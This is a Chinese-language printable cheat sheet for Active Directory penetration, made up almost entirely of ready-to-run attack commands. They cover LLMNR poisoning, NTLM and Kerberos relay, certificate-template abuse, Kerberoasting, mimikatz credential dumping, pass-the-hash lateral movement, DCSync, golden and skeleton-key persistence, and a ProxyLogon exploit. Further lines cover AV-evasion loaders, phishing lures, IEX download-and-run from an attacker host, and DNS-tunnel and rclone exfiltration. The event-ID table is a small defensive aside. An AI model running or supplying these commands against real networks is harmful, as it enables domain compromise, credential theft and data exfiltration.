# 域渗透速查表(打印版)

> 数据源:`~/tools/docs/` 10-16 号文档,命令原文照抄、参数未改。占位符:`<域>` `<域控IP>` `<用户>` `<密码>` `<哈希>`;证书链沿用 11 号原文 `<域名>` `<DC的IP>` `<CA名>`;MSSQL/Exchange 沿用 14/15 号 `<目标IP>` `<Exchange主机>`。深化细节回对应源文档。

**按处境跳转**

| 处境 | 直跳 |
|---|---|
| 域外,无任何凭据 | §1 → §2 |
| 有一个域用户账密/哈希 | §2 → §3 → §6 |
| 拿到一台域内机器 shell | §4(新凭据回 §2 复验)|
| 想从普通域用户打域控 | §7 |
| 已有 DA,要维持 | §8 |
| 有 Exchange/ADFS 暴露面,或 NTLM 中继被拦 | §11 |

### §0 接入准备(每次必做;源 10 阶段0 / 12)

```bash
sudo chronyd -q 'server <域控IP> iburst'   # 对时,Kerberos 容差 ±5 分钟
echo kali | sudo -S sed -i '1s|^|nameserver <域控IP>\n|' /etc/resolv.conf   # DNS 指向域控(被覆盖时:sudo resolvectl dns eth0 <域控IP>)
# /etc/krb5.conf 追加 [realms]+[domain_realm]:REALM=<域大写>,kdc/admin_server=<域控FQDN>(整段 heredoc 见 10 号阶段0)
echo '<密码>' | kinit <用户>@<域大写> && klist   # 验证票据可取
export KRB5CCNAME=/path/to/<票据>.ccache   # 指定票据文件,一切 -k 命令读它
```

### §1 域外无凭据·初始立足(源 10 阶段1)

```bash
nmap -sS -Pn -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 --open -oA adprobe <网段>/24   # AD 特征端口
~/tools/bin/fscan -h <网段>/24   # 全段一把梭:存活+端口+弱口令+漏洞
nxc smb <域控IP> -u 'a' -p '' --pass-pol 2>/dev/null | head -3   # 行首即域名;顺带看锁定阈值
nxc smb <网段>/24 --gen-relay-list relay.txt -u '' -p '' 2>/dev/null; cat relay.txt   # SMB 未签名→可中继清单(必做)
sudo responder -I eth0 -wv   # LLMNR/NBT-NS 毒化抓 NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt   # 破 NetNTLMv2
sudo mitm6 -d <域> -i eth0 &   # IPv6 DNS 接管
sudo impacket-ntlmrelayx -6 -wh <域控FQDN> -t ldaps://<域控IP> -socks --no-smb2support   # v6 中继→LDAPS
sudo impacket-ntlmrelayx -t http://<CA的FQDN>/certsrv/certfnsh.asp -smb2support --no-smb2support   # ESC8 中继拿机器证书
sudo impacket-ntlmrelayx -t ldaps://<域控FQDN> --delegate-access   # 中继→LDAPS:来者机器自动配 RBCD(接 §7 三步链)
sudo impacket-ntlmrelayx -t ldap://<域控FQDN> --dump-laps --dump-gmsa --dump-adcs   # 中继即倾泻:一次认证三件套全吐
sudo certipy relay -target http://<CA的FQDN> -template DomainController   # ESC8 一体化(certipy 自动中继+申请)
dnstool -u '<域>\<用户>' -p '<密码>' -r '*.<域名>' --action add --data <本机IP> --allow-multiple <域控IP>   # ADIDNS 通配符:解析不到的全回本机(清:--action remove)
nxc smb <网段>/24 -u <用户> -p '<密码>' --sessions --loggedon-users   # 在线会话狩猎:域管此刻在哪
sudo python3 ~/tools/src/PetitPotam/petitpotam.py <本机IP> <目标机器IP>   # 强制认证喂中继(coercer 多方法见 11 号)
nxc smb <域控IP> -u users.txt -p 'Password@2024' --continue-on-success   # 密码喷洒(先看 --pass-pol)
```

### §2 立足验证 + BloodHound 采集(源 10 阶段2)

```bash
nxc smb <域控IP> -u <用户> -p '<密码>'   # 账密验证(回显签名/PSP 状态)
nxc smb <域控IP> -u <用户> -H <哈希> --local-auth   # 哈希验证(PTH)
nxc smb <网段>/24 -u <用户> -p '<密码>' --continue-on-success   # 该凭据全网段落点
bloodhound-python -u <用户> -p '<密码>' -d <域> -dc <域控FQDN> -ns <域控IP> -c All --zip   # BH 采集→导入 http://127.0.0.1:8080
# BH 必看内置查询:Shortest Path to Domain Admin / Kerberoastable / AS-REP Roastable / Find All Paths
```

### §3 低垂果实·按序撸一遍(源 10/12)

```bash
impacket-GetNPUsers '<域>/' -dc-ip <域控IP> -usersfile users.txt -format hashcat -outputfile asrep.txt   # AS-REP 免密探测
impacket-GetNPUsers '<域>/<用户>:<密码>' -dc-ip <域控IP> -request -format hashcat -outputfile asrep.txt   # AS-REP 有凭据枚举
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt   # 破 AS-REP(RC4;AES 用 32200/32100)
impacket-GetUserSPNs -request -dc-ip <域控IP> '<域>/<用户>:<密码>' -outputfile tgs.txt   # Kerberoast 全量 SPN
impacket-GetUserSPNs -request -request-user <SPN账户> -dc-ip <域控IP> '<域>/<用户>:<密码>' -outputfile tgs.txt   # 只打指定账户(低噪)
nxc ldap <域控IP> -u <用户> -p <密码> --kerberoasting tgs.txt   # nxc 一步枚举+抓取
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt   # 破 TGS(RC4;AES 用 19700/19600)
impacket-Get-GPPPassword '<域>/<用户>:<密码>@<域控IP>'   # GPP cPassword(nxc 等价:-M gpp_password)
nxc smb <目标IP> -u <用户> -p '<密码>' --laps   # 可读 LAPS 直接吐管理密码
python3 ~/tools/src/gMSADumper/gMSADumper.py -u <用户> -p <密码> -d <域> -l <域控IP>   # gMSA NT 哈希(直接传递,别爆破)
impacket-findDelegation '<域>/<用户>:<密码>' -dc-ip <域控IP>   # 委托总览(为 §7 RBCD 铺路)
```

### §4 拿到机器 shell·落地三步(源 13)

```bash
impacket-smbserver share ~/tools/windows -smb2support   # 攻击机起 SMB 共享(带认证:-username kali -password 'P@ssw0rd!')
cd ~/tools/windows && python3 -m http.server 8080   # 攻击机起 HTTP
```

```bat
certutil -urlcache -f http://<攻击机IP>:8080/mimikatz/x64/mimikatz.exe C:\Temp\mimikatz.exe   # 下载(清缓存:certutil -urlcache * delete)
net use Z: \\<攻击机IP>\share   # 映射共享;用完 net use Z: /delete
powershell -ep bypass -c "IEX (irm http://<攻击机IP>:8080/PowerView.ps1)"   # ps1 内存加载不落盘
```

mimikatz 交互内(先进交互跑 `privilege::debug` + `token::elevate`;转储需管理员/SYSTEM):

```bat
sekurlsa::logonpasswords   # LSASS 登录凭据(NTLM,偶发明文)
sekurlsa::ekeys   # Kerberos 密钥(aes256→-aesKey,rc4 等价 NTLM)
lsadump::dcsync /domain:<域名> /user:krbtgt   # DCSync 指定账户(krbtgt→§8 金票)
kerberos::ptt C:\Temp\ticket.kirbi   # 票据注入(misc::cmd 起新 cmd 验证)
```

```powershell
Find-LocalAdminAccess   # 本凭据在哪批机器是本地管理员(横向目标清单)
Get-DomainObjectAcl -Identity <目标用户或组> -ResolveGUIDs   # ACL 攻击路径(GenericAll/WriteDacl…)
```

### §5 MSSQL 跳板:1433 → shell → 域凭据(源 14)

```bash
nmap -sU -p 1434 --script ms-sql-info <目标IP>   # SQL Browser 找命名实例(1433 不通必查)
nxc mssql <目标IP> -u sa -p '<密码>'   # SQL 验证(域账户:-u <域用户> -p '<密码>' -d <域名>;哈希 -H)
nxc mssql <目标网段CIDR> -u <用户字典文件> -p <密码字典文件> --ufail-limit 3   # 撞库防锁号
nxc mssql <目标IP> -u sa -p '<密码>' --rid-brute   # RID 枚举域用户
nxc mssql <目标IP> -u sa -p '<密码>' -M mssql_priv   # 权限体检,直给可打的提权路径
impacket-mssqlclient 'sa:<密码>@<目标IP>'   # 交互客户端(域账户加 -windows-auth)
```

mssqlclient 交互内置命令(免手打 SQL):

```bash
enable_xp_cmdshell   # 一键开 xp_cmdshell(用完 disable_xp_cmdshell 还原)
xp_cmdshell 'whoami'   # 执行系统命令;返回域账户=域立足点
xp_dirtree '\\<攻击机IP>\share'   # 服务账户 UNC 回连(配 responder 抓 NetNTLM)
exec_as_login sa   # IMPERSONATE 冒充 sa(退回 REVERT)
EXEC sp_linkedservers;   # 枚举链接服务器(横向跳板)
use_link <链接名>   # 切链接上下文(localhost 回本机)
```

```bash
nxc mssql <目标IP> -u sa -p '<密码>' -M link_xpcmd -o LINKED_SERVER=<链接名> CMD='whoami'   # 经链接远端执行命令
nxc mssql <目标IP> -u sa -p '<密码>' --sam   # 本地 SAM(--lsa 含 _SC_MSSQLSERVER 服务账户明文)
nxc mssql <目标IP> -u sa -p '<密码>' -x "nltest /dsgetdc:<域名>"   # 零落地定位域控
```

### §6 横向移动(源 10 阶段3 / 12)

```bash
impacket-secretsdump '<域>/<用户>:<密码>'@<目标IP>   # 远程 dump 本地 SAM+LSA
impacket-psexec     '<域>/<管理员>@<目标IP>' -hashes :<NT>   # PTH 半交互 SYSTEM(落服务留痕)
impacket-wmiexec    '<域>/<管理员>@<目标IP>' -hashes :<NT>   # 免落盘,更干净
impacket-smbexec    '<域>/<管理员>@<目标IP>' -hashes :<NT>   # SMBexec
impacket-atexec     '<域>/<管理员>@<目标IP>' -hashes :<NT>   # 计划任务执行单命令
evil-winrm -i <目标IP> -u <用户> -p '<密码>'   # WinRM 交互(5985 首选)
evil-winrm -i <目标IP> -u <用户> -H <NT哈希> -s ~/tools/src/PowerSploit/Recon   # 哈希+加载 PS 脚本目录
impacket-getTGT '<域>/<用户>' -hashes :<NT哈希> -dc-ip <域控IP>   # 哈希换 TGT(AES 版加 -aesKey)
impacket-ticketConverter <票据>@0.kirbi <票据>.ccache   # kirbi↔ccache 互转
export KRB5CCNAME=<票据文件>; impacket-psexec -k -no-pass '<域>/<用户>@<目标FQDN>'   # PTT(-k 目标写 FQDN 非 IP)
```

### §7 打域控(优先级:ADCS→委托→DCSync→NTDS→已知漏洞;源 10/11/12)

```bash
certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -json -output adcs   # ADCS 摸底
grep -oE '"ESC[0-9]+"' adcs.json | sort | uniq -c   # 命中哪些 ESC(对照 11 号小节)
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<模板名>' -upn 'administrator@<域名>'   # ESC1/2/6 自填 SAN 冒充域管
certipy template -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -template '<可写模板名>' -write-default-configuration   # ESC4 模板改成 ESC1 形态
certipy ca -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -add-officer '<用户>'   # ESC7 自封审批官(再 req→issue-request→retrieve)
sudo certipy relay -target http://<CA的IP> -template DomainController   # ESC8 一体化中继(触发源同 §1 PetitPotam)
certipy auth -pfx administrator.pfx -dc-ip <DC的IP>   # 证书→NT 哈希+TGT(通用收尾)
certipy auth -pfx administrator.pfx -ldap-shell -dc-ip <DC的IP>   # Schannel LDAPS shell(add_user/set_password)
impacket-addcomputer -computer-name 'EVIL$' -computer-pass '<机器账户密码>' -dc-ip <域控IP> '<域>/<用户>:<密码>'   # 建受控机器账户(MachineAccountQuota)
impacket-rbcd '<域>/<用户>:<密码>' -dc-ip <域控IP> -action write -delegate-to <目标机>$ -delegate-from <可控机>$   # RBCD 写 msDS-AllowedToAct
impacket-getST '<域>/<可控机>$:<机器账户密码>' -spn host/<目标机FQDN> -impersonate administrator -dc-ip <域控IP>   # S4U 取票(cifs/host/http 按用途)
export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass <域>/administrator@<目标机FQDN>   # RBCD 收官上 shell
impacket-secretsdump '<域>/<DA>:<密码>'@<域控FQDN> -just-dc-user krbtgt   # DCSync 单用户哈希
impacket-secretsdump '<域>/<DA>:<密码>'@<域控FQDN> -just-dc-ntlm   # 全域倾泻(哈希+历史+Kerberos 密钥)
nxc smb <域控IP> -u <DA> -p '<密码>' --ntds   # nxc 直拉 NTDS(--sam --lsa 为本地 SAM/LSA)
impacket-goldenPac '<域>/<用户>:<密码>'@<域控FQDN>   # MS14-068 兜底(2012R2 前老域)
```

### §8 权限维持·DA 落袋后(源 10/11/12)

```bash
impacket-lookupsid '<域>/<用户>:<密码>'@<域控IP> 0 | grep Domain   # 取域 SID(nxc 等价:--get-sid)
impacket-ticketer -domain <域> -domain-sid <域SID> -nthash <krbtgt的NT> -dc-ip <域控IP> -user-id 500 administrator   # 金票(全域通行;AES 版 -aesKey)
export KRB5CCNAME=administrator.ccache && klist && impacket-psexec -k -no-pass <域>/administrator@<域控FQDN>   # 金票上域控
impacket-ticketer -nthash <服务账户NT哈希> -domain-sid <域SID> -domain <域> -spn cifs/<目标主机名>.<域> administrator   # 白银票(单 SPN,不碰 KDC)
impacket-ticketer -request -user '<域>/<低权合法用户>:<密码>' -nthash <krbtgt的NT哈希> -domain-sid <域SID> -domain <域> administrator   # 钻石票(结构最像真实票)
python3 ~/tools/src/pywhisker/pywhisker/pywhisker.py -d <域> -u <DA> -p '<密码>' --target <目标用户> --action add   # 影子凭据(可写 KeyCredentialLink 即长期取票)
impacket-dacledit '<域>/<DA>:<密码>' -action write -target <傀儡用户> -acetype write-props -rights dcsync -dc-ip <域控IP>   # ACL 后门:低权户获 DCSync 权
certipy ca -u '<CA管用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -backup   # 抽 CA 私钥(黄金证书原料)
certipy forge -ca-pfx <CA名>.pfx -ca-password '<CA的pfx密码>' -upn 'administrator@<域名>' -subject 'CN=Administrator,CN=Users,DC=<域>,DC=<域>' -out golden.pfx   # 离线铸黄金证书(无申请日志,接 §7 auth)
```

### §9 失败回退·精简版(完整决策树见 10 号)

```text
凭据失败:LOCKED 换号+--pass-pol 调节奏 | LOGON_FAILURE 换字典/大小写 | PASSWORD_EXPIRED 走 impacket-changepasswd | CLOCK_SKEW 回 §0 对时
中继失败:SMB 签名强制→转 LDAPS 或 ESC8(HTTP 不受限)| NTLM 中继全线被拦→Kerberos 中继(krbrelayx,CVE-2022-33679,见 §11)| LDAPS 被拒→-t http://<CA> 或 -socks 挂会话 | mitm6 无 v6 流量→responder+喷洒
certipy req:DENIED→find -vulnerable 重看 ESC 编号 | CA 不可达→relay 中继或转 Kerberos 链 | auth 失败→查时间/krb5.conf,-kirbi 转 mimikatz ptt
横向被拦:psexec→wmiexec→atexec→evil-winrm 逐级换 | LSASS 读取失败(PPL)→13 号 comsvcs MiniDump | 全程 EDR 压制→转 C2(sliver generate)
ZeroLogon:打完必须恢复机器账户哈希,否则域控断网(OPSEC 灾难)
```

### §10 审计 ID 对照(粘自 10 号场景矩阵)

| 场景 | 触发审计 |
|---|---|
| responder 毒化 | 4776(NTLM 验证)|
| mitm6+LDAPS 中继 | 4776+5145(目录服务复制)|
| ESC8 中继打 CA | CA 颁发记录+PetitPotam 5145 |
| 密码喷洒 | 4625 批量失败(锁号风险)|
| BH 采集+低垂果实 | 大量 LDAP 查询(低噪)|
| Kerberoast | 4769(RC4 加密类型)|
| AS-REP Roast | 4768 预认证失败 |
| mimikatz 转储 | 4656/4663(LSASS 句柄)|
| PTH 横向(psexec) | 4624(类型3)+7045 服务安装 |
| RBCD 写属性 | 5136(msDS-AllowedToActOnBehalf)|
| ESC1-13 证书 | CA 颁发日志+4768(PKINIT)|
| DCSync/NTDS | 4662(复制目录更改)|
| 金票维持 | 4624(伪造票,无 4768 前置)|
| goldenPac/ZeroLogon | Netlogon 5827-5831 |
| MSSQL xp_cmdshell | SQL 审计 33205 |
| Kerberos 中继(CVE-2022-33679) | 4769(rc4 0x17)|
| Certifried(CVE-2022-26923) | 5136(dNSHostName 三连)|
| LAPS v2 读取 | LDAP 查询+GKDI 异常 |
| Exchange ProxyLogon 系 | IIS 日志+4625 批量 |
| 黄金 ADFS | ADFS 500-501 事件 |

### §11 Exchange / ADFS / 新打法(源 15 / 16;打印第二页)

```bash
# Exchange 指纹(三连:owa 版本/ecp/autodiscover)
curl -sk -o /dev/null -D - https://<Exchange主机>/owa/auth/logon.aspx | grep -i -E "x-owa-version|x-server"   # 版本头
~/tools/bin/ruler --url https://<Exchange主机>/autodiscover/autodiscover.xml -u <用户名> -p '<密码>' -k check   # MAPI 凭据/可达双验(PTH 用 --hash <NT哈希>)
# ProxyLogon 一键(2021-03 前补丁;ProxyShell 换模块名 exchange_proxyshell_rce)
msfconsole -q -x 'use exploit/windows/http/exchange_proxylogon_rce; set RHOSTS <Exchange主机>; set EMAIL <已知邮箱>; set LHOST <本机IP>; run -j; exit'
# Kerberos 中继(CVE-2022-33679,NTLM 中继全拦时的杀手锏)
sudo krbrelayx -t ldaps://<DC主机名>.<域名> --delegate-access   # 机器账户→LDAP,直配 RBCD 委派
sudo krbrelayx -t ldap://<DC主机名>.<域名> --escalate-user '<低权用户>'   # 改走 ACL 拔权路线
# Certifried(CVE-2022-26923,已控机器户+2022-05 前补丁)
certipy req -u '<域名>/EVIL$' -p '<新机器密码>' -dc-ip <DC的IP> -ca '<CA名>' -template Machine   # SAN 自动取 dNSHostName→DC 证书
# Windows LAPS v2(nxc 自动识别新旧并解密)
nxc ldap <DC的IP> -u '<用户>' -p '<密码>' -d <域名> -M laps   # 有读取权即吐明文
# 黄金 ADFS 第一步(DCSync ADFS 服务账户;后续 ADFSDump/ADFSpoof 链见 15 号)
impacket-secretsdump '<域名>/<域管>:<密码>@<域控FQDN>' -just-dc-user svc_adfs

### §12 后域渗透全家桶(源 17-25;打印第三页)

```bash
# 持久化(源 17;mimikatz 交互内,域控内存级)
misc::skeleton            # 给本机 LSASS 注入骨架钥匙;无 ERROR 行即成功生效
# 钓鱼(源 18;payload→ISO(绕MotW)/LNK/宏三件套)
cd ~/tools/windows && ~/tools/bin/make-lure.sh ./pay.exe ~/tools/lures/finance-wave1
# SCCM(源 19)
sccmhunter find -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP> -resolve   # SCCM 资产+NAA 展开
sccmhunter smb -u <域用户> -p '<密码>' -d <域名> -dc-ip <域控IP> -save   # PXE 变量文件存盘(loot/)
# 免杀(源 20)
python3 Shhhloader.py /tmp/sc.bin -o update.exe        # 默认流:加密+QueueUserAPC+系统调用
python3 Shhhloader.py /tmp/sc.bin -m PoolParty -s domain -sa <目标域> -o svchost.exe   # 高对抗形态
# 渗出(源 21)
sudo dnscat2-server exfil.example.com                # DNS 隧道,默认 0.0.0.0:53
~/tools/bin/rclone copy ~/tools/loot odc:2026-xx --bwlimit 500k -P        # crypt 加密+限速外传
# 跨域/多域(源 22/25)
impacket-raiseChild '<子域>/<子域DA>:<密码>' -w child2parent.ccache   # 子域→父域一键
~/tools/bin/trust-map.sh <用户> '<密码>'   # 遍历项目域测绘信任拓扑(mermaid 图入项目)

### §13 收割/溯源/域内Linux/补充面(源 26/27)

```bash
# 工作组五步(26 §1):空会话→单哈希喷→SAM 雪球→PTH
nxc smb <目标IP> -u '' -p '' --rid-brute                                # LOGON_FAILURE 后第一刀
nxc smb <网段>/24 -u administrator -H <NT哈希> --local-auth --continue-on-success   # 命门:本地管理员复用
nxc smb <命中IP> -u administrator -H <NT哈希> --local-auth --sam      # 雪球弹药
impacket-wmiexec './administrator@<IP>' -hashes :<NT哈希>              # 工作组写 .\
# 连接溯源两问(26 §8;执行台 win-trace/lin-trace 一键)
last -F -a | head -20                                                   # Linux:谁连过来(带来源IP)
cat ~/.ssh/known_hosts | awk '{print $1}' | sort -u                     # Linux:连过谁(铁证)
# 浏览器(26 §4):Firefox 拖回 logins.json+key4.db → 本机解
python3 ~/tools/src/firepwd/firepwd.py <含两文件的目录>
# 域内 Linux(27 §1):keytab 三连
klist -kt /etc/krb5.keytab                                              # 主体列表(帮助原文实测)
klist -k -K /etc/krb5.keytab                                            # 连密钥一起出
kinit -kt ./web01.keytab 'HOST/web01.test.local@TEST.LOCAL' -c web01.ccache   # keytab→票据→GSSAPI 直连
# 敏感文件定向(27 §4;无 PATTERN 选项,下载后本地关键词)
nxc smb <网段>/24 -u <域用户> -p '<密码>' -M spider_plus -o DOWNLOAD_FLAG=True MAX_FILE_SIZE=999kb EXCLUDE_EXTS=ico,lnk
```

